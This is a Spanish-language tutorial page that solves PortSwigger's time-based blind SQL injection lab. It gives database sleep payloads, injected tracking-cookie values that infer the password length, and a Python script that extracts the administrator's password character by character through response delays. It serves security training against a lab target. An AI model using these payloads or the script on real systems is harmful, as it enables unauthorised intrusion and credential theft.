---
layout: default
title: Ejercicio práctico
permalink: /injection_types/blind/time_based_type/time_based_exercise
nav_order: 1
parent: 4.3 Basadas en tiempo
grand_parent: 4. Inyecciones ciegas
---

# Ejercicio practico de inyección ciega basada en tiempo

> Ejercicio basado en el laboratorio "Lab: Blind SQL injection with time delays and information retrieval" de Web Security Academy (PortSwigger)


## Consigna
Este laboratorio contiene una vulnerabilidad de inyección SQL en una cookie de seguimiento y realiza una consulta SQL que contiene el valor de la cookie presentada.

Los resultados de la consulta SQL no se devuelven, y la aplicación no responde de manera diferente en función de si la consulta devuelve filas o causa un error. Sin embargo, dado que la consulta se ejecuta sincrónicamente, es posible activar retrasos de tiempo condicionales para inferir información.

Se nos pide iniciar sesión como usuario administrador, además de indicarnos que existe una tabla `users` con columnas llamadas `username` y `password`.


## Resolución con Python
Utilizando la herramienta ZAP y el navegador que este nos proporciona, vamos a intervenir nuestra consultas y visitaremos la página principal del sitio web. El enunciado menciona que la vulnerabilidad se encuentra en la cookie de seguimiento `TrakingId` por lo que vamos a trabajar sobre la misma.

Inicialmente podemos validar la existencia de la vulnerabilidad de cualquiera de las siguientes formas para cada tipo de base:
**Oracle: ** `dbms_pipe.receive_message(('a'),10)`
**Microsoft: ** `WAITFOR DELAY '0:0:10'`
**PostgreSQL:**`SELECT pg_sleep(10)`
**MySQL**`SELECT SLEEP(10)`

Por lo que modificando el `TrakingId` de la siguiente manera podemos validar la misma:
`TrakingId=XXXXXXXX'||(SELECT pg_sleep(5))-- -; `

Bien, sabemos que la vulnerabilidad esta presente, tenemos que extraer la contraseña del administrador y para eso necesitamos conocer la longitud de la misma, 

`TrakingId=XXXXXXXX'||(SELECT case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where useranme='administrator' and length(password)>=15)--+-;`

De esta manera solo debemos ir variando el número hasta que:



Conocemos que la longitud es 20, ahora debemos extraer la contraseña, teniendo en cuenta que conocemos la tabla, las columnas y hasta el nombre del usuario (administrador), una forma simple y eficaz sería la siguiente:
`TrakingId=XXXXXXXX'||(SELECT case when substring(password,%d,1)='%s' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')--+-;`

De esta manera podemos ir probando entre las diferentes combinaciones donde esta %d (para ir iterando entre cada posición de la contraseña del 1 al 20) y %s (para iterar sobre todas posibles opciones las cuales incluyen los caracteres alfanuméricos).

Para automatizar las consultas podemos apoyarnos en un script en Python3:

```python
#!/usr/bin/python3
import requests,time,sys,string

main_url = 'https://BURPSUITE-LAB/filter?category=Pets' #URL Del laboratorio

characters = string.ascii_lowercase + string.digits #Caracteres alfanuméricos

def makeRequest():
    print("Iniciando SQLi")
    password = ""

    for position in range(1,21): #Posiciones de la contraseña del 0 al 20
        for character in characters:

            cookies = {
                    'TrackingId':"XYZ'||(select case when substring(password,%d,1)='%s' then pg_sleep(2) else pg_sleep(0) end from users where username='administrator')-- -" %(position,character),
                    'session':'session Cookie'}
            time_start=time.time()
            r = requests.get(main_url, cookies=cookies)
            time_end = time.time()

            if time_end - time_start > 2: #Tiempo de respuesta mayor a 2 segundos (inyeccion exitosa)
                password += character
                print("Password: %s (%s)"%(password,position))
                break

if __name__ == '__main__':
    makeRequest()
```
Para este ejemplo se tuvo en cuenta que la contraseña del administrador solo posee letras minúsculas y números. En un caso diferente, tendríamos que incluir dentro del arreglo de "characters" todos los caracteres posibles para la contraseña (Letras mayúsculas, caracteres especiales etc).


La desventaja de esta tecnica es que requiere una alta cantidad de consultas para probar todas las  posibles combinaciones, si bien se realizara mediante un script para automatizarlo, si lo que queremos es optimizar la cantidad de consultas, podemos apoyarnos en los consejos de optimización nombrados en la sección [4.1 Inyeccion SQL ciega con respuestas condicionales](https://spassarop.github.io/test-page/injection_types/blind/conditional_type#optimizaciones)



